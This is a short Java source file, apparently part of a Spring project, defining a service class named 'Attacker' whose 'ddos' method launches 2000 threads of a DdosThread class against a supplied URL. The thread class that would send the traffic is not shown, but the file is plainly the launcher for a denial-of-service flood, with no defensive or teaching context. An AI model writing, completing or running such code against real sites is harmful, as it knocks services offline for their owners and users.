package com.dacky.controller;


import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;

@Slf4j
@Service
public class Attacker {

    public void ddos(String url) throws Exception {
        DdosThread thread;
        for (int i = 0; i < 2000; i++) {
            thread = new DdosThread(url);
            thread.start();
        }
    }

}
